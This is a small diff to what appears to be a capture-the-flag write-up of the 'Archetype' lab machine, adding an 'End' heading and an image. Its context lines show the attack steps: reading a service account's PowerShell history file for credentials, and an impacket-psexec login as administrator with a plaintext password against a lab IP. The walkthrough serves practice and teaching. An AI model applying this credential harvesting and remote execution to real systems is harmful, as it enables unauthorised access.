@@ -68,3 +68,5 @@ type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Co
 impacket-psexec administrator:MEGACORP_4dm1n\!\!@10.129.68.227
 ```
 ![](assets/images/posts/2025-03-06-Archetype/b6f674ba7e741830131344c63efa0a6a_MD5.jpeg)
+## End
+![](assets/images/posts/2025-03-06-Archetype/6440ee4900b98344e460390a8f1497a2_MD5.jpeg)
